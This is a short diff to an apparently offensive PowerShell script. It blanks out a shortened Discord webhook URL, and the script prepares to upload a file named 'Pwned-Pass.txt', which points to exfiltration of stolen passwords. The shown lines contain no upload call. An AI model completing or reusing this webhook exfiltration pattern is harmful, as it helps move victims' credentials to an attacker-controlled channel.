@@ -1,5 +1,5 @@
 # Define your Discord webhook URL
-$webhookUrl = "https://tinyurl.com/3u67z8wa"
+$webhookUrl = ""
 
 # Path to the file you want to upload
 $filePath = "Pwned-Pass.txt"
